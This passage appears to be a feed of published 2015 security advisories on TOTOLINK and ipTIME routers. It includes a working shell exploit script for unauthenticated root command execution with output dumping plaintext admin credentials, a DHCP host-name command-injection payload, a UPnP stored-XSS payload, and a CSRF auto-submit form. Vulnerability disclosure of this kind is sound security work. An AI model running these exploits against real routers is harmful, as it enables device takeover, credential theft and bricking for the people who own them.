Argument Name:  NewEnabled
Data Type:      boolean
Allowed Values: []
Set NewEnabled value to: 1

Required argument:
Argument Name:  NewExternalPort
Data Type:      ui2
Allowed Values: []
Set NewExternalPort value to: 80

Required argument:
Argument Name:  NewRemoteHost
Data Type:      string
Allowed Values: []
Set NewRemoteHost value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewProtocol
Data Type:      string
Allowed Values: ['TCP', 'UDP']
Set NewProtocol value to: TCP

Required argument:
Argument Name:  NewInternalPort
Data Type:      ui2
Allowed Values: []
Set NewInternalPort value to: 80


upnp&gt;


The UPNP webpage in the administration area (http://192.168.0.1/popup_upnp_portmap.html) will show:

[...]
&lt;tr&gt;
&lt;td class=item_td&gt;TCP&lt;/td&gt;
&lt;td class=item_td&gt;21331&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS")&lt;script&gt;alert("XSS");&lt;/script&gt;:28777&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;&lt;/td&gt;
&lt;/tr&gt;
[...]


- - - - From my research, there are some bits overflapping with others, resulting in showing funny ports
and truncating input data. A remote DoS against the upnpd process seems to be easily done.

Gaining Remote Code Execution by UPNP exploitation is again left as a exercise for the reader.



## Vendor Response

Due to "un-ethical code" found in TOTOLINK products (= backdoors found in new TOTOLINK devices), TOTOLINK was not contacted in regard of this case.



## Report Timeline

* Apr 20, 2015: Vulnerabilities found by Pierre Kim in ipTIME devices.
* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jun 25, 2015: Vulnerabilities found in TOTOLINK products by looking for similar ipTIME products.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Pierre Kim (@PierreKimSec).



## Greetings

Big thanks to Alexandre Torres.



## References

https://pierrekim.github.io/advisories/2015-totolink-0x01.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/PbAAoJEMQ+Dtp9ky28JPQQAIaJJ3qgA0YZQ7AG39aUav3t
z53mLvi5Cej3FfLVFxWeejbdkLWRLQCr+jwLH/oNyc4V4N/aDE7X8LNWDsN5LRQv
wN21zY83sGkcG8FB3cSSubMjWZ2ZjeH7MSwSryXjfIO/RAFfRFFPV/1abdkqQWIn
WvLHkDMI/8fHJc5mNJeAqqtsK9+t0kz6OdABmvAA5dNGd1ZddEaG/HW8xnebcAlh
ByuLynQ5rgUGr+eTmB+DZinMk1e/P6ZiEs0urmIshUYeX3gx808Q68tF7jKcJNtr
lC5NVJ6h8cQ3pjMOMs/5RQLcC6aCRidX3AoaO/kyibMTz+F6VwJD2WQwxb78M0B3
FjjrHb+v1MdLhantwhZ1mfznm7rJ1/5TCq0hVjQ6sXc5/KbkZRQWq8IC65I6kFRm
aRp2U17C5OLJ4KQ2vYb/0yy4KaIL1C7gCB2oWZ8CyyG53wn79CxcPQ5uO2Jnf6XM
UP597Bq1JDlDsTGpMjf0kBZ8v2vcjc3gN8EZg7T2w4aNuxMjm+Y8gbu51s8yDSdC
G0xg6mqZa2ZIt2FbWmMgo/+t04aBaUGB4y5tIeILWH2FFrHlpyvtuU5IMys/DiO+
7Nr8g4RTEskP8x2/TAh05YJYcY8Bai5RTAQaTwT3cUNdp3B8UiLxtVwfTzmI4//F
bjG1WlLuMMpz1dwPfEB6
=c3Q7
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>15 TOTOLINK router models vulnerable to multiple RCEs</title>
        <link href="2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: 15 TOTOLINK router models vulnerable to multiple RCEs
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerabilities Summary

The first vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single HTTP request.

The second vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single DHCP request.

There are direct RCEs against the routers which give a complete root access to the embedded Linux from the LAN side.

The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:

- - TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
- - TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
- - TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin - totolink.net)
- - TOTOLINK EX300 : until last firmware (9.36 - ex300_ch_9_36.bin.5357c0 - totolink.cn)
- - TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
- - TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
- - TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
- - TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
- - TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
- - TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK N302R Plus V1_en_8_82.bin)
- - TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK N302R Plus V2_en_9_08.bin)
- - TOTOLINK A3004NS (no firmware available in totolinkusa.com but ipTIME's A3004NS model was vulnerable to the 2 RCEs)
- - TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)


The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares to the latest firmwares with the default configuration:

- - TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
- - TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)


Firmwares come from totolink.net and from totolink.cn.

- - From my tests, it is possible to use these vulnerabilities to overwrite the firmware with a custom (backdoored) firmware.

Concerning the high CVSS score (10/10) of the vulnerabilities and the longevity of this vulnerability (6+ year old),
the TOTOLINK users are urged to contact TOTOLINK.



## Details - RCE with a single HTTP request

The HTTP server allows the attacker to execute some CGI files.

Many of them are vulnerable to a command inclusion which allows to execute commands with the http daemon user rights (root).


Exploit code:

$ cat totolink.carnage
#!/bin/sh
if [ ! $1 ]; then
echo "Usage:"
echo $0 ip command
exit 1
fi
wget -qO- --post-data="echo 'Content-type: text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh


The exploits have been written in HTML/JavaScript, in form of CSRF
attacks, allowing people to test their systems in live using their
browsers:
http://pierrekim.github.io/advisories/


o Listing of the filesystem

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-listing.of.the.filesystem.html

Using CLI:

root@kali:~/totolink# ./totolink.carnage 192.168.1.1 ls | head
ash
auth
busybox
cat
chmod
cp
d.cgi
date
echo
false
root@kali:~/totolink#


o How to retrieve the credentials ? (see login and password at the end of the text file)

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-dump.configuration.including.credentials.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 cat /tmp/etc/iconfig.cfg
wantype.wan1=dynamic
dhblock.eth1=0
ppp_mtu=1454
fakedns=0
upnp=1
ppp_mtu=1454
timeserver=time.windows.com,gmt22,1,480,0
wan_ifname=eth1
auto_dns=1
dhcp_auto_detect=0
wireless_ifmode+wlan0=wlan0,0
dhcpd=0
lan_ip=192.168.1.1
lan_netmask=255.255.255.0
dhcpd_conf=br0,192.168.1.2,192.168.1.253,192.168.1.1,255.255.255.0
dhcpd_dns=164.124.101.2,168.126.63.2
dhcpd_opt=7200,30,200,
dhcpd_configfile=/etc/udhcpd.conf
dhcpd_lease_file=/etc/udhcpd.leases
dhcpd_static_lease_file=/etc/udhcpd.static
use_local_gateway=1
login=admin
password=admin

Login and password are stored in plaintext, which is a very bad security practice.


o Current running process:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-current.process.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 ps -auxww


o Getting the kernel memory:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-getting.kernel.memory.html

Using CLI:

kali# ./totolink.carnage 192.168.1.1 cat /proc/kcore


o Default firewall rules:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-default.firewall.rules.html

Using CLI:

kali# ./iptime.carnage.l2.v9.52 192.168.1.1 iptables -nL


o Opening the management interface on the WAN:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-opening.the.firewall.html


o Reboot the device:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-reboot.html


o Brick the device:

HTML/JS exploits:

http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-bricking.the.device.html


An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.

By the way, d.cgi in /bin/ is an intentional backdoor.



## Details - RCE with a single DHCP request

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD server in TOTOLINK devices allows remote attackers to execute arbitrary commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:


Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

[...]
WiFi Simple Config v1.12 (2009.07.31-11:35+0000).

Launch iwcontrol: wlan0
Reaped 317
iwcontrol RUN OK
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
WAN0 IP: 192.168.2.1
signalling START
Invalid upnpd exit
killall: upnpd: no process killed
upnpd Restart 1
iptables: Bad rule (does a matching rule exist in that chain?)
Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
Update Session timestamp and try it after 5 seconds again.
ez_ipupdate callback --&gt; time_elapsed: 0
Run DDNS by IP change:  / 192.168.2.1
Reaped 352
iptables: Bad rule (does a matching rule exist in that chain?)
Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
Reaped 363
Led Silent Callback
Turn ON All LED
Dynamic Channel Search for wlan0 is OFF
start_signal =&gt; plantynet_sync
Do start_signal =&gt; plantynet_sync
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
Reaped 354
iptables: Bad rule (does a matching rule exist in that chain?)
ez_ipupdate callback --&gt; time_elapsed: 1
Run DDNS by IP change:  / 192.168.2.1
Burst DDNS Registration is denied: iptime -&gt; now:26
Led Silent Callback
Turn ON All LED
/proc/sys/net/ipv4/tcp_syn_retries: cannot create
- - - - ---&gt; Plantynet Event : 00000003
- - - - ---&gt; PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE


[sending the DHCP request]


[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1 00:01:03 miniupnpd[370]: received signal 15, good-bye
Reaped 392
Reaped 318
Reaped 314
Reaped 290
Reaped 288
Reaped 268
Reaped 370
Reaped 367
- - - - ---&gt; PLANTYNET_SYNC_FREE_DEVICE
Restarting system.

Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Reboot Result from Watchdog Timeout!

- - - - ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
Delay 1 second till reset button
Magic Number: raw_nv 00000000
Check Firmware(05020000) : size: 0x001ddfc8 ----&gt;


[...]


An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.



## Vendor Response

Due to "un-ethical code" found in TOTOLINK products (= backdoors found in new TOTOLINK devices), TOTOLINK was not contacted in regard of this case, but ipTIME was contacted in April 2015 concerning the first RCE.



## Report Timeline

* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in ipTIME products.
* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and EX750 routers.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/MEAAoJEMQ+Dtp9ky28q5QP/iv9DnkWIYfVBsd9DCRjwkhp
bJDnignaI9xbQJxw40eCcDvaEhCVKrpwpbY0SA1e0uVwTAoZIZKOuI+VZR33dU9M
+YaaxrWz8mhGUis2WrtVufNKTjKKoIeefHn9n5fjg18BKVlTcVW4sMpJAUCbI/c7
7We3dAJgIuEVSScVHB9jsCRipZwsGzUfeLOqUboJHekmna4R2rxrVHs0noArMJdH
IucAskoOupBP7oiWH5ifsKQSBXxKVZZihukJbWhBDeO4R2jvwgVx5cgzsezRWz4U
EIO9skElbOKF8YWUzejMtVFP/lYVqfhixu3uoWmkVyVK4QwT8sM5mSk/xoBzc/9+
/SA1nSflRgfuD3RBHdmUGaM9dqyldlUggfHUvx6RMXsI/zI2LHk+0w6Bl/3vBuzG
MURIbiHm4T8SoKOC9nbPDSK9oaKoL/g0yYGkbtw87fuhYJP1Su2Xy+CG6LsBP2eM
LpxxgLGHl6HBX4pqrHaHBbureM+wrAFbHetp1SG0rjiUkXJLgwo9pbnx1a3oe7ik
gqQZRaveyQK+sOJdiCwgMTR4wsi3hoY+1UlntKil+XW0+Vf9arDwaTzrJs2zn1Us
qYspmrBsBibG4T4W/reCIGU3lTNyiOWi80qGgqzab0k2/MLU23YB6ktwz8AxzpTv
rXDUveDVcMt/YxA9/nKu
=XzCM
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>127 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request</title>
        <link href="2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


## Advisory Information

Title: 127 ipTIME router models vulnerable to an unauthenticated RCE by sending a crafted DHCP request
Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x02.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html
Date published: 2015-07-06
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea
with millions of devices deployed in the country. EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.
There are =~ 10 000 000 of ipTIME devices deployed in South Korea.



## Vulnerability Summary

This vulnerability allows to bypass the admin authentication and to get a direct RCE from the LAN side with a single DHCP request.

This is a direct RCE against the routers which gives a complete root access to the embedded Linux from the LAN side.

It affects 127 ipTIME products from 2009-era firmwares to the current firwmare (9.66, built time 2015-06-11) with the default configuration:


- ipTIME a1004
- ipTIME a1004v
- ipTIME a104
- ipTIME a104ns
- ipTIME a104r
- ipTIME a2004
- ipTIME a2004ns
- ipTIME a2004r
- ipTIME a2008
- ipTIME a3004
- ipTIME a3004ns
- ipTIME a5004ns
- ipTIME a604
- ipTIME a604v
- ipTIME extac
- ipTIME extd2
- ipTIME g1
- ipTIME g104
- ipTIME g104a
- ipTIME g104be
- ipTIME g104i
- ipTIME g104m
- ipTIME g204
- ipTIME g501
- ipTIME g504
- ipTIME ipsmart
- ipTIME mini
- ipTIME mobap1
- ipTIME multi
- ipTIME n1
- ipTIME n104
- ipTIME n104a
- ipTIME n104ar1
- ipTIME n104i
- ipTIME n104k
- ipTIME n104ktt
- ipTIME n104m
- ipTIME n104p
- ipTIME n104q
- ipTIME n104r
- ipTIME n104r3
- ipTIME n104rsk
- ipTIME n104s
- ipTIME n104sr1
- ipTIME n104t
- ipTIME n104v
- ipTIME n104vlg
- ipTIME n1e
- ipTIME n1eky
- ipTIME n1p
- ipTIME n2
- ipTIME n2e
- ipTIME n2p
- ipTIME n3004
- ipTIME n5
- ipTIME n5004
- ipTIME n504
- ipTIME n5r1
- ipTIME n6004
- ipTIME n6004m
- ipTIME n6004r
- ipTIME n604
- ipTIME n604a
- ipTIME n604i
- ipTIME n604m
- ipTIME n604p
- ipTIME n604r
- ipTIME n604s
- ipTIME n604t
- ipTIME n604v
- ipTIME n604vlg
- ipTIME n608
- ipTIME n7004ns
- ipTIME n702bcm
- ipTIME n704
- ipTIME n704a
- ipTIME n704a3
- ipTIME n704bcm
- ipTIME n704lg
- ipTIME n704m
- ipTIME n704mlg
- ipTIME n704ns
- ipTIME n704s
- ipTIME n704v
- ipTIME n704v3
- ipTIME n8004
- ipTIME n8004r
- ipTIME n8004v
- ipTIME n804
- ipTIME n804a
- ipTIME n804a3
- ipTIME n804t
- ipTIME n804t3
- ipTIME n804v
- ipTIME n904
- ipTIME n904ns
- ipTIME n904v
- ipTIME ng104
- ipTIME ng304
- ipTIME ntq104
- ipTIME ntv108
- ipTIME ntv116
- ipTIME ntv124
- ipTIME q1
- ipTIME q304
- ipTIME q504
- ipTIME q604
- ipTIME t1004
- ipTIME t1008
- ipTIME t16000
- ipTIME t2008
- ipTIME t24000
- ipTIME t3004
- ipTIME t3008
- ipTIME timeve
- ipTIME tq204
- ipTIME tv104
- ipTIME v1016
- ipTIME v1024
- ipTIME v304
- ipTIME v308
- ipTIME v504
- ipTIME wre1
- ipTIME x3003
- ipTIME x3007
- ipTIME x5007
- ipTIME x6003


The probability that firmware 9.68 (last firmware for these specific models) running in the below products is vulnerable is VERY high:


- ipTIME q304
- ipTIME q1
- ipTIME q504
- ipTIME ew302
- ipTIME n702bcm
- ipTIME a3004ns
- ipTIME a5004ns


Concerning the high CVSS score (10/10) of the vulnerability, the number of affected devices and the longevity of this vulnerability (6+ year old),
the ipTIME users are urged to contact ipTIME.



## Details

This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD server in ipTIME devices allows remote attackers to execute arbitrary commands
via shell metacharacters in the host-name field.

Sending a DHCP request with this parameter will reboot the device:

cat /etc/dhcp/dhclient.conf

send host-name ";/sbin/reboot";

When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:


Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

[...]
WiFi Simple Config v1.12 (2009.07.31-11:35+0000).

Launch iwcontrol: wlan0
Reaped 317
iwcontrol RUN OK
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
WAN0 IP: 192.168.2.1
signalling START
Invalid upnpd exit
killall: upnpd: no process killed
upnpd Restart 1
iptables: Bad rule (does a matching rule exist in that chain?)
Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
Update Session timestamp and try it after 5 seconds again.
ez_ipupdate callback --&gt; time_elapsed: 0
Run DDNS by IP change:  / 192.168.2.1
Reaped 352
iptables: Bad rule (does a matching rule exist in that chain?)
Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
Reaped 363
Led Silent Callback
Turn ON All LED
Dynamic Channel Search for wlan0 is OFF
start_signal =&gt; plantynet_sync
Do start_signal =&gt; plantynet_sync
SIGNAL -&gt; Config Update signal progress
killall: pppoe-relay: no process killed
SIGNAL -&gt; WAN ip changed
Reaped 354
iptables: Bad rule (does a matching rule exist in that chain?)
ez_ipupdate callback --&gt; time_elapsed: 1
Run DDNS by IP change:  / 192.168.2.1
Burst DDNS Registration is denied: iptime -&gt; now:26
Led Silent Callback
Turn ON All LED
/proc/sys/net/ipv4/tcp_syn_retries: cannot create
- ---&gt; Plantynet Event : 00000003
- ---&gt; PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE


[sending the DHCP request]


[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1 00:01:03 miniupnpd[370]: received signal 15, good-bye
Reaped 392
Reaped 318
Reaped 314
Reaped 290
Reaped 288
Reaped 268
Reaped 370
Reaped 367
- ---&gt; PLANTYNET_SYNC_FREE_DEVICE
Restarting system.

Booting...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@
@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Reboot Result from Watchdog Timeout!

- ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
Delay 1 second till reset button
Magic Number: raw_nv 00000000
Check Firmware(05020000) : size: 0x001ddfc8 ----&gt;


[...]




An attacker can use the /usr/bin/wget binary located in the file system of the remote device to plant a backdoor and then execute it as root.

- From my tests, it is possible to use this vulnerability to overwrite the firmware with a custom (backdoored) firmware.



## Vendor Response

- From my experience, contacting EFMNetworks ipTIME proved to be useless.
They don't publish security information in the changelog, they don't answer to security researchers and
they don't credit them either.
EFMNetworks ipTIME was not contacted in regard of this case.



## Report Timeline

* Jun 02, 2014: Vulnerability found by Pierre Kim.
* Apr 07, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jun 25, 2015: Vulnerability confirmed on all the existing versions from 2009 to 2015 including the last firmware version (9.66).
* Jul 06, 2015: A public advisory is sent to security mailing lists.



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-iptime-0x02.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/



-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVmcxDAAoJEMQ+Dtp9ky28/vgP/RexWVHpSEIxER8l/JbShcuC
mUKpgvxFzLNqFbqXRrf1obB7DhJ2H1q1e1Nq/w02QZDBnhN3A6e52cBFNw7SLQ9V
zuoNX3o/we9LkPN1rQsQniPiPp3GqtzgE8+mXzyWSgGBrk+9xa3Wymn3Z1VlZjUy
L+gmfYIgyv7RRnAOqZn8k2eJOFdrytp4I7RlGP9eBUas8M+Sd0Y9cFmF9OsaAJtC
SrerzyAt1onlNpeiMGWqI6hyqK/Fh2JSDzeYrYMZVjUgR/ffaLS+7WQSjByunCR5
XlpsgxGKqpqrpOd6IVdE9YMKS2/zi9oiEd3fRIxNHGZ+yjGHThK562lhLgm+aeMf
nRDMJaby4qvhztChktT8z0ie0C/3xW6I1K2VlEi+89Z5N6951TsZcFgUq65mLi7l
x0s3Q9BblZ21+W5nD3dJlK+F+NX6s0+MzAv44r4lAP4nuJ5k0zHw7LIHQ09boZX2
+4zJa1vZjFgsVCC0QgVdbpR3pPn9MSwsPiMOcqwZZALrJpQRljNm7+A/fKO9kDUx
z7MZVnoY2090EpspCrE3wA6AGYdrzVg3tc9U90hc+kdMRTR0cOpK5TDf9ArN6Bok
kTPhnpOftrEVYOA1JLeOvSPNFLYK193niQE46TrTlQMUVKsummhtTJY8oe+rtQMf
WHjFp48VR2JM+PMRW0BR
=c35o
-----END PGP SIGNATURE-----
</code></pre>
<p>More vulnerabilities regarding ipTIME products are likely to be released soon.</p></content>
    </entry>
    
    <entry>
        <title>ipTIME n104r3 vulnerable to CSRF and XSS attacks</title>
        <link href="2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html"/>
        <content type="html"><p>The ipTIME n104r3 is a wireless LAN router. Its current firmware (9.58) with default configuration is vulnerable to CSRF-attacks and stored XSS attacks.</p>
<p>Click the links below to access to the exploits:</p>
<ul>
<li><a href="http://pierrekim.github.io/advisories/">The exploits have been written in HTML/JavaScript allowing people to test their systems in live using their browsers</a></li>
<li><a href="http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-change_dns_csrf_bypass.html">CSRF-attack changing the DNS configuration to 0.2.0.7 and 1.2.0.1</a></li>
<li><a href="http://pierrekim.github.io/advisories/2015-iptime-0x01-PoC-activate_admin_wan_csrf_bypass.html">CSRF-attack activating the remote control management on port 31337/tcp listening on the WAN interface</a>.</li>
</ul>
<p>CSRF-attack activating the remote control management on port 31337/tcp:
<img alt="" src="images/2015-iptime-0x01-remote-management.png" /></p>
<p>Stored XSS:</p>
<p><img alt="" src="images/2015-iptime-0x01-stored-xss.png" /></p>
<p>Complete advisory:</p>
<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512



## Advisory Information

Title: iptime n104r3 vulnerable to CSRF and XSS attacks
Advisory URL: https://pierrekim.github.io/advisories/2015-iptime-0x01.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-03-iptime-n104r3-vulnerable-to-CSRF-and-XSS-attacks.html
Date published: 2015-07-03
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

EFMNetworks ipTIME is the largest Korean brand of SOHO/small/middle entreprise Routers/WiFi APs/Modems/Firewalls in South Korea with millions of devices deployed in the country.
EFMNetworks ipTIME is occupying more than 60 percent of personal network devices.



## Vulnerability Summary

The ipTIME n104r3 is a wireless LAN router. Its current firmware (9.58) with default configuration is
vulnerable to CSRF-attacks and XSS attacks.
Since, its anti-CSRF protection is based on a static HTTP referrer (RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of the router. Owners are urged to
contact ipTIME, and activate authentication on this product (disabled by default).

Due to the fact the firmware seems to be used on several products, it is highly likely that other products
of ipTIME are vulnerable.
The probability that the N104T is also vulnerable is very high but I don't have possibility to test the
exploits against live ipTIME N104T routers.



## Details - CSRF

The HTTP interface allows to edit the configuration. This interface is vulnerable to CSRF.

Configuration and settings can be modified with CSRF attacks:
- Activate the remote control management
- Change the DNS configuration
- Update the firmware
- Change the Wifi Configuration
- Create TCP redirections to the LAN
- and more...


Example of forms exploiting the CSRF:


o Activating the remote control management on port 31337/tcp listening on the WAN interface.

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.0.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="SYS"&gt;
&lt;input type="hidden" name="GO" value="firewallconf_accesslist.html"&gt;
&lt;input type="hidden" name="nowait" value="1"&gt;
